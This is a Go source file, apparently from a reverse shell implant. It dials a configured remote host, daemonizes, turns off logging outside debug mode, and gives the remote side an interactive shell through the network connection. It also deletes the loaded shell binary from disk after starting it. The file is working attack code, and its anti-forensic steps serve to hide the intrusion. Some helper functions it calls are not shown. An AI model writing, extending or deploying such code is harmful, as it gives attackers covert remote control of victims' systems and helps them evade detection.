package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

func main() {
	config := readConfig()
	startReverseShell(config)
}

func startReverseShell(config Config) {
	daemonize()

	if !config.Debug {
		disableLogging()
	}

	host := fmt.Sprintf("%s:%d", config.Addr, config.Port)
	conn, err := net.Dial(config.Protocol, host)
	check(err)

	stdin := startShell(config.Path, conn)
	reader := newNetLineReader(conn, config.Timeout)

	// Feed input from network until timeout value exceeds or EOF is met.
	// Either way the process will panic and terminate, causing the shell
	// to exit.
	for {
		line, err := reader.Readline()
		check(err)

		_, err = stdin.Write(line)
		check(err)
	}
}

// startShell starts a shell, and returns a pipe to the stdin
// of that shell
func startShell(shellpath string, conn net.Conn) io.WriteCloser {
	shellpath = loadShell(shellpath)

	shell := exec.Command(shellpath, "-i")
	shell.Stdout = conn
	shell.Stderr = conn

	stdin, err := shell.StdinPipe()
	check(err)

	check(shell.Start())

	check(os.RemoveAll(shellpath))

	return stdin
}
